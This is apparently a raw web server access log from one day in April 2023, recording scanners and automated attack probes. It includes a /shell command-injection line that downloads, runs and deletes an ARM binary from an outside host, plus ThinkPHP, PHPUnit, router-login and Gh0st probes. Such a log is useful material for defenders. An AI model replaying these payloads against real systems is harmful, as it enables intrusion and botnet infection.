37.220.152.59 - - [26/Apr/2023:10:08:04 +0300] "GET / HTTP/1.1" 200 76616 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
179.43.177.243 - - [26/Apr/2023:10:15:58 +0300] "GET / HTTP/1.1" 200 76118 "-" "Hello World"
195.178.120.37 - - [26/Apr/2023:10:29:45 +0300] "-" 408 0 "-" "-"
37.220.152.59 - - [26/Apr/2023:10:45:36 +0300] "GET / HTTP/1.1" 200 76617 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
198.199.118.95 - - [26/Apr/2023:11:12:22 +0300] "GET / HTTP/1.1" 200 22344 "-" "Mozilla/5.0 zgrab/0.x"
193.32.162.159 - - [26/Apr/2023:11:19:33 +0300] "GET / HTTP/1.1" 200 22842 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
143.244.147.206 - - [26/Apr/2023:11:34:44 +0300] "\x16\x03\x01" 400 486 "-" "-"
209.97.142.94 - - [26/Apr/2023:11:34:48 +0300] "GET / HTTP/1.1" 200 22585 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
209.97.142.94 - - [26/Apr/2023:11:34:56 +0300] "GET /favicon.ico HTTP/1.1" 404 491 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
142.93.226.26 - - [26/Apr/2023:11:36:24 +0300] "GET / HTTP/1.0" 200 75633 "-" "-"
111.20.101.103 - - [26/Apr/2023:12:11:40 +0300] "GET / HTTP/1.1" 400 486 "-" "-"
37.220.152.59 - - [26/Apr/2023:12:12:51 +0300] "GET / HTTP/1.1" 200 76614 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
92.118.39.82 - - [26/Apr/2023:12:17:02 +0300] "GET / HTTP/1.1" 200 75881 "-" "-"
85.217.144.136 - - [26/Apr/2023:12:20:40 +0300] "CONNECT 84.153.78.7:4444 HTTP/1.1" 200 75947 "-" "-"
193.32.162.159 - - [26/Apr/2023:12:40:53 +0300] "GET / HTTP/1.1" 200 22844 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
64.62.197.142 - - [26/Apr/2023:12:50:57 +0300] "GET / HTTP/1.1" 200 22481 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 OPR/94.0.0.0"
64.62.197.137 - - [26/Apr/2023:12:52:46 +0300] "GET /favicon.ico HTTP/1.1" 404 435 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
64.62.197.150 - - [26/Apr/2023:12:53:22 +0300] "GET /geoserver/web/ HTTP/1.1" 404 435 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 OPR/94.0.0.0"
179.43.177.243 - - [26/Apr/2023:13:02:47 +0300] "POST /boaform/admin/formLogin HTTP/1.1" 404 491 "http://37.220.87.22:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
157.245.77.56 - - [26/Apr/2023:13:20:53 +0300] "\x16\x03\x01\x02" 400 486 "-" "-"
157.245.77.56 - - [26/Apr/2023:13:20:53 +0300] "GET / HTTP/1.1" 200 22472 "-" "HTTP Banner Detection (https://security.ipip.net)"
157.245.77.56 - - [26/Apr/2023:13:20:54 +0300] "\x16\x03\x01\x02" 400 486 "-" "-"
157.245.77.56 - - [26/Apr/2023:13:20:54 +0300] "GET /favicon.ico HTTP/1.1" 404 491 "-" "HTTP Banner Detection (https://security.ipip.net)"
157.245.77.56 - - [26/Apr/2023:13:20:54 +0300] "\x16\x03\x01\x02" 400 486 "-" "-"
157.245.77.56 - - [26/Apr/2023:13:21:00 +0300] "\x16\x03\x03\x01\xa5\x01" 400 486 "-" "-"
157.245.77.56 - - [26/Apr/2023:13:21:00 +0300] "\x16\x03\x03\x01\xa5\x01" 400 486 "-" "-"
157.245.77.56 - - [26/Apr/2023:13:21:01 +0300] "\x16\x03\x03\x01H\x01" 400 486 "-" "-"
157.245.77.56 - - [26/Apr/2023:13:21:01 +0300] "\x16\x03\x03\x01V\x01" 400 486 "-" "-"
157.245.77.56 - - [26/Apr/2023:13:21:01 +0300] "\x16\x03\x03\x01\x99\x01" 400 486 "-" "-"
157.245.77.56 - - [26/Apr/2023:13:21:01 +0300] "\x16\x03\x02\x01\x9a\x01" 400 486 "-" "-"
157.245.77.56 - - [26/Apr/2023:13:21:01 +0300] "\x16\x03\x01\x01\xa7\x01" 400 486 "-" "-"
157.245.77.56 - - [26/Apr/2023:13:21:01 +0300] "\x16\x03\x01\x01\xa7\x01" 400 486 "-" "-"
157.245.77.56 - - [26/Apr/2023:13:21:01 +0300] "\x16\x03\x01\x01\x9d\x01" 400 486 "-" "-"
157.245.77.56 - - [26/Apr/2023:13:21:01 +0300] "\x16\x03\x01\x01\xb4\x01" 400 486 "-" "-"
154.209.125.66 - - [26/Apr/2023:13:59:53 +0300] "GET / HTTP/1.1" 200 76814 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
152.89.196.222 - - [26/Apr/2023:14:00:07 +0300] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 454 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
37.220.79.196 - - [26/Apr/2023:14:06:50 +0300] "GET / HTTP/1.1" 200 76615 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
152.89.196.222 - - [26/Apr/2023:14:14:50 +0300] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 454 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
36.156.22.4 - - [26/Apr/2023:14:23:30 +0300] "\x16\x03\x01" 400 486 "-" "-"
36.156.22.4 - - [26/Apr/2023:14:23:31 +0300] "GET / HTTP/1.1" 200 22488 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
36.156.22.4 - - [26/Apr/2023:14:23:31 +0300] "\x16\x03\x01" 400 486 "-" "-"
36.156.22.4 - - [26/Apr/2023:14:23:32 +0300] "\x16\x03\x01" 400 486 "-" "-"
36.156.22.4 - - [26/Apr/2023:14:23:33 +0300] "\x16\x03\x01" 400 486 "-" "-"
36.156.22.4 - - [26/Apr/2023:14:23:33 +0300] "\x16\x03\x01" 400 486 "-" "-"
36.156.22.4 - - [26/Apr/2023:14:23:34 +0300] "\x16\x03\x01" 400 486 "-" "-"
152.89.196.222 - - [26/Apr/2023:14:24:12 +0300] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 454 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
118.123.105.86 - - [26/Apr/2023:14:28:50 +0300] "\x16\x03\x01" 400 486 "-" "-"
118.123.105.86 - - [26/Apr/2023:14:28:51 +0300] "\x16\x03\x01" 400 486 "-" "-"
118.123.105.86 - - [26/Apr/2023:14:29:45 +0300] "\x16\x03\x03\x01\xa5\x01" 400 486 "-" "-"
118.123.105.86 - - [26/Apr/2023:14:29:46 +0300] "\x16\x03\x03\x01\xa5\x01" 400 486 "-" "-"
118.123.105.86 - - [26/Apr/2023:14:29:47 +0300] "\x16\x03\x03\x01V\x01" 400 486 "-" "-"
118.123.105.86 - - [26/Apr/2023:14:29:48 +0300] "\x16\x03\x03\x01H\x01" 400 486 "-" "-"
118.123.105.86 - - [26/Apr/2023:14:29:49 +0300] "\x16\x03\x03\x01\x99\x01" 400 486 "-" "-"
118.123.105.86 - - [26/Apr/2023:14:29:50 +0300] "\x16\x03\x02\x01\x9a\x01" 400 486 "-" "-"
118.123.105.86 - - [26/Apr/2023:14:29:51 +0300] "\x16\x03\x01\x01\xa7\x01" 400 486 "-" "-"
118.123.105.86 - - [26/Apr/2023:14:29:52 +0300] "\x16\x03\x01\x01\xa7\x01" 400 486 "-" "-"
118.123.105.86 - - [26/Apr/2023:14:29:55 +0300] "\x16\x03\x01\x01\x9d\x01" 400 486 "-" "-"
152.89.196.222 - - [26/Apr/2023:14:30:38 +0300] "GET /index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 200 22776 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
34.140.130.61 - - [26/Apr/2023:14:34:26 +0300] "GET / HTTP/1.1" 200 22657 "-" "python-requests/2.28.2"
37.220.152.59 - - [26/Apr/2023:14:39:23 +0300] "GET / HTTP/1.1" 200 76636 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
5.255.253.36 - - [26/Apr/2023:14:50:48 +0300] "GET / HTTP/1.1" 200 22507 "-" "Mozilla/5.0 (compatible; YandexUserproxy; robot; +http://yandex.com/bots)"
37.220.79.196 - - [26/Apr/2023:14:51:34 +0300] "GET / HTTP/1.1" 200 76618 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
152.89.196.222 - - [26/Apr/2023:14:53:30 +0300] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 22585 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.88.66.237 - - [26/Apr/2023:14:55:19 +0300] "POST /boaform/admin/formLogin HTTP/1.1" 404 491 "http://37.220.87.22:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
146.70.58.133 - - [26/Apr/2023:15:04:25 +0300] "POST / HTTP/1.1" 200 22658 "-" "record"
213.108.196.20 - - [26/Apr/2023:15:06:55 +0300] "\x16\x03\x01" 400 486 "-" "-"
213.108.196.20 - - [26/Apr/2023:15:06:56 +0300] "GET / HTTP/1.1" 200 22499 "-" "MOT-L7v/08.B7.5DR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0"
213.108.196.20 - - [26/Apr/2023:15:06:56 +0300] "GET /favicon.ico HTTP/1.1" 404 454 "-" "MOT-L7v/08.B7.5DR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0"
141.8.142.32 - - [26/Apr/2023:15:07:40 +0300] "GET /cap HTTP/1.1" 404 491 "-" "Mozilla/5.0 (compatible; YandexUserproxy; robot; +http://yandex.com/bots)"
193.32.162.159 - - [26/Apr/2023:15:08:05 +0300] "GET / HTTP/1.1" 200 22842 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
165.227.0.21 - - [26/Apr/2023:15:37:42 +0300] "GET / HTTP/1.0" 200 76452 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:98.0) Gecko/20100101 Firefox/98.0"
37.220.152.59 - - [26/Apr/2023:15:50:49 +0300] "GET / HTTP/1.1" 200 76615 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
208.78.41.113 - - [26/Apr/2023:15:56:46 +0300] "GET /aaa9 HTTP/1.1" 404 491 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
37.220.79.196 - - [26/Apr/2023:16:15:31 +0300] "GET / HTTP/1.1" 200 76615 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
152.89.196.222 - - [26/Apr/2023:16:21:04 +0300] "GET /actuator/gateway/routes HTTP/1.1" 404 454 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
37.220.79.196 - - [26/Apr/2023:16:40:23 +0300] "GET / HTTP/1.1" 200 76634 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
172.105.128.13 - - [26/Apr/2023:16:43:23 +0300] "\x16\x03\x01" 400 486 "-" "-"
37.220.152.59 - - [26/Apr/2023:16:44:17 +0300] "GET / HTTP/1.1" 200 76618 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
40.113.118.83 - - [26/Apr/2023:17:09:23 +0300] "GET /an7jd0qo6kt5bk5bq4er8fe1xp7hl2vk/sqlite3.dll HTTP/1.1" 404 454 "-" "Go-http-client/1.1"
193.32.162.159 - - [26/Apr/2023:17:24:01 +0300] "GET / HTTP/1.1" 200 22846 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
37.220.79.196 - - [26/Apr/2023:17:25:10 +0300] "GET / HTTP/1.1" 200 76634 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
37.220.152.59 - - [26/Apr/2023:17:29:58 +0300] "GET / HTTP/1.1" 200 76618 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
38.54.25.201 - - [26/Apr/2023:17:36:19 +0300] "GET /index.php HTTP/1.1" 200 77619 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0"
38.54.25.201 - - [26/Apr/2023:17:36:20 +0300] "GET /phpmyadmin/index.php HTTP/1.1" 404 435 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0"
167.94.138.51 - - [26/Apr/2023:18:09:33 +0300] "GET / HTTP/1.1" 200 75883 "-" "-"
167.94.138.51 - - [26/Apr/2023:18:09:33 +0300] "GET / HTTP/1.1" 200 22399 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.138.51 - - [26/Apr/2023:18:09:33 +0300] "PRI * HTTP/2.0" 400 486 "-" "-"
167.94.138.51 - - [26/Apr/2023:18:09:33 +0300] "GET /favicon.ico HTTP/1.1" 404 454 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
178.128.41.83 - - [26/Apr/2023:18:14:09 +0300] "\x16\x03\x01\x02" 400 486 "-" "-"
167.99.190.225 - - [26/Apr/2023:18:14:13 +0300] "\x16\x03\x01" 400 486 "-" "-"
159.223.126.110 - - [26/Apr/2023:18:14:14 +0300] "\x16\x03\x03\x01\xa5\x01" 400 486 "-" "-"
159.223.126.110 - - [26/Apr/2023:18:14:14 +0300] "\x16\x03\x03\x01\xa5\x01" 400 486 "-" "-"
159.223.126.110 - - [26/Apr/2023:18:14:14 +0300] "\x16\x03\x03\x01V\x01" 400 486 "-" "-"
159.223.126.110 - - [26/Apr/2023:18:14:15 +0300] "\x16\x03\x03\x01H\x01" 400 486 "-" "-"
159.223.126.110 - - [26/Apr/2023:18:14:15 +0300] "\x16\x03\x03\x01\x99\x01" 400 486 "-" "-"
159.223.126.110 - - [26/Apr/2023:18:14:15 +0300] "\x16\x03\x02\x01\x9a\x01" 400 486 "-" "-"
159.223.126.110 - - [26/Apr/2023:18:14:15 +0300] "\x16\x03\x01\x01\xa7\x01" 400 486 "-" "-"
144.126.234.98 - - [26/Apr/2023:18:14:15 +0300] "GET / HTTP/1.1" 200 22586 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
159.223.126.110 - - [26/Apr/2023:18:14:15 +0300] "\x16\x03\x01\x01\xa7\x01" 400 486 "-" "-"
159.223.126.110 - - [26/Apr/2023:18:14:16 +0300] "\x16\x03\x01\x01\x9d\x01" 400 486 "-" "-"
159.223.126.110 - - [26/Apr/2023:18:14:16 +0300] "\x16\x03\x01\x01\xb4\x01" 400 486 "-" "-"
144.126.234.98 - - [26/Apr/2023:18:14:16 +0300] "GET /favicon.ico HTTP/1.1" 404 490 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
85.217.144.136 - - [26/Apr/2023:18:14:29 +0300] "CONNECT 84.153.78.7:4444 HTTP/1.1" 200 75949 "-" "-"
157.245.72.78 - - [26/Apr/2023:18:14:58 +0300] "GET /3000D00E0000FFFF3F0031313744373731343634304537353046007A7A7A7A7A7A7A7A7A7A7A7A7A7A7A0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000008047A7A7A7A7A7A7A7A7A0000000000000000000000000000000000000000000000000000000000000000 HTTP/1.1" 403 443 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.1.4322)"
157.245.72.78 - - [26/Apr/2023:18:15:01 +0300] "\xbf\xbf\xaf\xaf~" 400 486 "-" "-"
157.245.72.78 - - [26/Apr/2023:18:15:01 +0300] "POST / HTTP/1.1" 200 76632 "-" "WinHttpClient"
134.122.54.126 - - [26/Apr/2023:18:15:16 +0300] "GET / HTTP/1.0" 200 75632 "-" "-"
134.122.54.126 - - [26/Apr/2023:18:15:17 +0300] "Gh0st\xad" 400 486 "-" "-"
134.122.54.126 - - [26/Apr/2023:18:15:21 +0300] "HELP" 400 486 "-" "-"
134.122.54.126 - - [26/Apr/2023:18:15:21 +0300] "\x1b\x84\xd5\xb0]\xf4\xc4\x93\xc50\xc2X\x8c\xda\xb1\xd7\xac\xafn\x1d\xe1\x1e\x1a3*\x85\xb7\x1d'\xb1\xc9k\xbf\xf0\xbc\n" 400 486 "-" "-"
134.122.54.126 - - [26/Apr/2023:18:15:22 +0300] "\x16\x03\x01" 400 486 "-" "-"
134.122.54.126 - - [26/Apr/2023:18:15:24 +0300] "\xbd\xff\x9e\xffE\xff\x9e\xff\xbd\xff\x9e\xff\xa4\xff\x86\xff\xc4\xff\xbe\xff\xc7\xff\xdb\xff\xee\xffx\\d9\xff\xed\xff\xa4\xff\x9d\xff\xcf\xff\xd8\xff\xe5\xff\x04\xff\x12\xff0\xff\xb1\xff\xbd\xff\xe7\xff\xe2\xff\xdd\xff\xdc\xff\xde\xff\xc8\xff\xcc\xff\xbe\xff\xf8\xff&\xff\x01\xff\x0f\xff\xf5\xff\x06\xff\xff\xff\xf7\xff!\xff\xde\xff\x02\xff&\xff\x0c\xff\x01\xff\xf5\xff\n" 400 486 "-" "-"
159.65.219.198 - - [26/Apr/2023:18:16:04 +0300] "GET / HTTP/1.0" 200 75635 "-" "-"
85.217.144.136 - - [26/Apr/2023:18:23:27 +0300] "CONNECT 84.153.78.7:4444 HTTP/1.1" 200 75947 "-" "-"
193.35.18.251 - - [26/Apr/2023:18:42:45 +0300] "POST /boaform/admin/formLogin HTTP/1.1" 404 491 "http://37.220.87.22:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
213.108.196.20 - - [26/Apr/2023:19:07:53 +0300] "GET / HTTP/1.1" 200 22539 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/418.8 (KHTML, like Gecko) Safari/419.3"
213.108.196.20 - - [26/Apr/2023:19:14:09 +0300] "GET / HTTP/1.1" 200 22560 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36"
213.108.196.20 - - [26/Apr/2023:19:25:44 +0300] "GET /aaa9 HTTP/1.1" 404 435 "-" "curl/7.85.0"
213.108.196.20 - - [26/Apr/2023:19:25:46 +0300] "GET /aaa9 HTTP/1.1" 404 435 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
213.108.196.20 - - [26/Apr/2023:19:25:48 +0300] "GET /aab9 HTTP/1.1" 404 435 "-" "curl/7.85.0"
213.108.196.20 - - [26/Apr/2023:19:25:50 +0300] "GET /aab9 HTTP/1.1" 404 435 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
213.108.196.20 - - [26/Apr/2023:19:26:44 +0300] "GET /%0 HTTP1.1" 400 486 "-" "-"
37.220.152.59 - - [26/Apr/2023:19:38:03 +0300] "GET / HTTP/1.1" 200 76615 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
37.220.79.196 - - [26/Apr/2023:19:38:29 +0300] "GET / HTTP/1.1" 200 76615 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
1.233.206.27 - - [26/Apr/2023:19:52:00 +0300] "GET /shell?cd+/tmp;+wget+http:/\\/196.196.196.2/YourName/BinName.arm;+chmod+777+BinName.arm;+./BinName.arm Jaws.Selfrep;rm+-rf+BinName.arm" 400 486 "-" "-"
198.199.118.163 - - [26/Apr/2023:19:58:18 +0300] "GET /portal/redlion HTTP/1.1" 404 435 "-" "Mozilla/5.0 zgrab/0.x"
37.220.152.59 - - [26/Apr/2023:20:15:30 +0300] "GET / HTTP/1.1" 200 76618 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
37.120.215.247 - - [26/Apr/2023:20:22:16 +0300] "GET / HTTP/1.1" 200 22668 "-" "Mozilla/5.0 (X11; CrOS x86_64 8172.45.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.64 Safari/537.36"
157.230.6.200 - - [26/Apr/2023:20:23:40 +0300] "\x16\x03\x03\x01\xa5\x01" 400 486 "-" "-"
146.190.242.149 - - [26/Apr/2023:20:23:40 +0300] "\x16\x03\x01" 400 486 "-" "-"
157.230.6.200 - - [26/Apr/2023:20:23:40 +0300] "\x16\x03\x03\x01\xa5\x01" 400 486 "-" "-"
157.230.6.200 - - [26/Apr/2023:20:23:40 +0300] "\x16\x03\x03\x01V\x01" 400 486 "-" "-"
157.230.6.200 - - [26/Apr/2023:20:23:40 +0300] "\x16\x03\x03\x01H\x01" 400 486 "-" "-"
157.230.6.200 - - [26/Apr/2023:20:23:40 +0300] "\x16\x03\x03\x01\x99\x01" 400 486 "-" "-"
157.230.6.200 - - [26/Apr/2023:20:23:41 +0300] "\x16\x03\x02\x01\x9a\x01" 400 486 "-" "-"
157.230.6.200 - - [26/Apr/2023:20:23:41 +0300] "\x16\x03\x01\x01\xa7\x01" 400 486 "-" "-"
157.230.6.200 - - [26/Apr/2023:20:23:41 +0300] "\x16\x03\x01\x01\xa7\x01" 400 486 "-" "-"
157.230.6.200 - - [26/Apr/2023:20:23:41 +0300] "\x16\x03\x01\x01\x9d\x01" 400 486 "-" "-"
157.230.6.200 - - [26/Apr/2023:20:23:41 +0300] "\x16\x03\x01\x01\xb4\x01" 400 486 "-" "-"
104.248.208.136 - - [26/Apr/2023:20:23:50 +0300] "\x16\x03\x01\x02" 400 486 "-" "-"
157.230.144.207 - - [26/Apr/2023:20:23:53 +0300] "GET / HTTP/1.1" 200 22587 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
157.230.144.207 - - [26/Apr/2023:20:23:54 +0300] "GET /favicon.ico HTTP/1.1" 404 490 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
64.225.71.202 - - [26/Apr/2023:20:24:40 +0300] "GET /3000D00E0000FFFF3F0031313744373731343634304537353046007A7A7A7A7A7A7A7A7A7A7A7A7A7A7A0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000008047A7A7A7A7A7A7A7A7A0000000000000000000000000000000000000000000000000000000000000000 HTTP/1.1" 403 443 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.1.4322)"
64.225.71.202 - - [26/Apr/2023:20:24:43 +0300] "\xbf\xbf\xaf\xaf~" 400 486 "-" "-"
64.225.71.202 - - [26/Apr/2023:20:24:43 +0300] "POST / HTTP/1.1" 200 76632 "-" "WinHttpClient"
144.126.234.98 - - [26/Apr/2023:20:25:03 +0300] "GET / HTTP/1.0" 200 75635 "-" "-"
144.126.234.98 - - [26/Apr/2023:20:25:05 +0300] "Gh0st\xad" 400 486 "-" "-"
144.126.234.98 - - [26/Apr/2023:20:25:08 +0300] "HELP" 400 486 "-" "-"
144.126.234.98 - - [26/Apr/2023:20:25:08 +0300] "\x1b\x84\xd5\xb0]\xf4\xc4\x93\xc50\xc2X\x8c\xda\xb1\xd7\xac\xafn\x1d\xe1\x1e\x1a3*\x85\xb7\x1d'\xb1\xc9k\xbf\xf0\xbc\n" 400 486 "-" "-"
144.126.234.98 - - [26/Apr/2023:20:25:09 +0300] "\x16\x03\x01" 400 486 "-" "-"
144.126.234.98 - - [26/Apr/2023:20:25:11 +0300] "\xbd\xff\x9e\xffE\xff\x9e\xff\xbd\xff\x9e\xff\xa4\xff\x86\xff\xc4\xff\xbe\xff\xc7\xff\xdb\xff\xee\xffx\\d9\xff\xed\xff\xa4\xff\x9d\xff\xcf\xff\xd8\xff\xe5\xff\x04\xff\x12\xff0\xff\xb1\xff\xbd\xff\xe7\xff\xe2\xff\xdd\xff\xdc\xff\xde\xff\xc8\xff\xcc\xff\xbe\xff\xf8\xff&\xff\x01\xff\x0f\xff\xf5\xff\x06\xff\xff\xff\xf7\xff!\xff\xde\xff\x02\xff&\xff\x0c\xff\x01\xff\xf5\xff\n" 400 486 "-" "-"
164.90.200.39 - - [26/Apr/2023:20:25:56 +0300] "GET / HTTP/1.0" 200 75633 "-" "-"
192.241.219.19 - - [26/Apr/2023:20:29:42 +0300] "GET /hudson HTTP/1.1" 404 435 "-" "Mozilla/5.0 zgrab/0.x"
37.220.79.196 - - [26/Apr/2023:20:29:51 +0300] "GET / HTTP/1.1" 200 76616 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
192.241.195.99 - - [26/Apr/2023:20:32:57 +0300] "GET /actuator/health HTTP/1.1" 404 435 "-" "Mozilla/5.0 zgrab/0.x"
193.32.162.159 - - [26/Apr/2023:20:37:31 +0300] "GET / HTTP/1.1" 200 22843 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
37.220.152.59 - - [26/Apr/2023:21:28:58 +0300] "GET / HTTP/1.1" 200 76636 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
198.235.24.195 - - [26/Apr/2023:21:48:49 +0300] "GET / HTTP/1.0" 200 76849 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
1.233.206.27 - - [26/Apr/2023:22:00:22 +0300] "GET /shell?cd+/tmp;+wget+http:/\\/196.196.196.2/YourName/BinName.arm;+chmod+777+BinName.arm;+./BinName.arm Jaws.Selfrep;rm+-rf+BinName.arm" 400 486 "-" "-"
138.197.130.154 - - [26/Apr/2023:22:06:57 +0300] "\x16\x03\x01" 400 486 "-" "-"
